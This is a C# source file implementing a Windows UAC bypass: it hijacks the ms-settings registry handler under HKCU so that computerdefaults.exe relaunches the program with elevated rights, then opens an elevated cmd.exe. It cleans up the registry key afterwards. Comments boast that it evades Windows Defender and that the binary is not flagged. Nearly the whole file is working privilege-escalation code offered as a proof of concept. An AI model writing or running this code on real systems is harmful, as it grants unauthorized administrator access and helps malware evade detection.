using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace UACME.uac
{
    internal class regen
    {
        public static void BoopMe()
        {
            try
            {
                if (!Settings.IsUserAnAdmin())
                {
                    Bypass.RegBoop();

                }
                else if (Settings.IsUserAnAdmin())
                {
                    //this method seems to bypass defender
                    //5-02-2021 and binary is not flagged
                    string WhatToElevate = "cmd.exe"; // cmd.exe will be elevated as an example and PoC
                   // Thread.Sleep(5000);
                    Process.Start("cmd.exe", "/c start " + WhatToElevate);
                    RegistryKey uac_clean = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings", true);
                    uac_clean.DeleteSubKeyTree("shell"); //deleting this is important because if we won't delete that right click of windows will break.
                    uac_clean.Close();
                }

            }
            catch { Environment.Exit(0); }
        }
        #region uac_bypass
        public class Bypass
        {
            public static void RegBoop()
            {
                WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
                if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
                {
                    Bypass.Zoop("Classes");
                    Bypass.Zoop("Classes\\ms-settings");
                    Bypass.Zoop("Classes\\ms-settings\\shell");
                    Bypass.Zoop("Classes\\ms-settings\\shell\\open");
                    RegistryKey registryKey = Bypass.Zoop("Classes\\ms-settings\\shell\\open\\command");
                    string cpath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                    registryKey.SetValue("", cpath, RegistryValueKind.String);
                    registryKey.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
                    registryKey.Close();
                    try
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            CreateNoWindow = true,
                            UseShellExecute = false,
                            FileName = "cmd.exe",
                            Arguments = "/c start computerdefaults.exe"
                        });
                    }
                    catch { }
                    Process.GetCurrentProcess().Kill();
                }
                else
                {
                    RegistryKey registryKey2 = Bypass.Zoop("Classes\\ms-settings\\shell\\open\\command");
                    registryKey2.SetValue("", "", RegistryValueKind.String);
                }
            }

            public static RegistryKey Zoop(string x)
            {
                RegistryKey RegKey = Registry.CurrentUser.OpenSubKey("Software\\" + x, true);
                bool flag = !Bypass.Check(RegKey);
                if (flag)
                {
                    RegKey = Registry.CurrentUser.CreateSubKey("Software\\" + x);
                }
                return RegKey;
            }

            public static bool Check(RegistryKey k)
            {
                bool flag = k == null;
                return !flag;
            }

            private static ManagementObject GetMangementObject(string className)
            {
                ManagementClass managementClass = new ManagementClass(className);
                try
                {
                    foreach (ManagementBaseObject managementBaseObject in managementClass.GetInstances())
                    {
                        ManagementObject managementObject = (ManagementObject)managementBaseObject;
                        bool flag = managementObject != null;
                        if (flag)
                        {
                            return managementObject;
                        }
                    }
                }
                catch { }
                return null;
            }

            public static string GetVersion()
            {
                string result;
                try
                {
                    ManagementObject ManageObj = Bypass.GetMangementObject("Win32_OperatingSystem");
                    bool flag = ManageObj == null;
                    if (flag)
                    {
                        result = string.Empty;
                    }
                    else
                    {
                        result = (ManageObj["Version"] as string);
                    }
                }
                catch (Exception ex)
                {
                    result = string.Empty;
                }
                return result;
            }
        }
        #endregion

    }
}

